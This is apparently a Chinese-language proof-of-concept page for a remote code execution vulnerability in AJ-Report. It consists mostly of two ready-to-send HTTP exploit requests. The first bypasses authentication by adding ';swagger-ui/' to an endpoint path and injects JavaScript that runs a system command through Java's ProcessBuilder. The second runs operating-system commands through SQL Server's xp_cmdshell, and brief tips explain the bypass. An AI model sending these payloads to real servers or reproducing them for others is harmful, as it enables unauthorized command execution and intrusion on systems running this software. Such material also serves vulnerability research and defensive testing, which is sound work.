# AJ-Report RCE 远程代码执行漏洞

![alt text](photos/image.png)

## POC 1
```
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
Host: XXX
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 369
 
{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"cat\",\"/flag.txt\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
```
## POC 2
```
POST /dataSet/testTransform HTTP/2
Host: XXX
Sec-Ch-Ua-Platform: "Windows"
Authorization: XXX
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
Origin: https://XXX
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://XXX/
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9
X-Forwarded-For: 127.0.0.1
Content-Length: 145

{"sourceCode":"sygqsj","dynSentence":"exec xp_cmdshell 'whoami&&ipconfig'","dataSetParamDtoList":[],"dataSetTransformDtoList":[],"setType":"sql"}
```

***tips:<br>***
- **POC1接口为 /dataSetParam/verification 通过;swagger-ui/可认证绕过。<br>**
- **POC2为接口 /dataSet/testTransform，需要认证信息。**

## 漏洞复现

![alt text](photos/image1.png)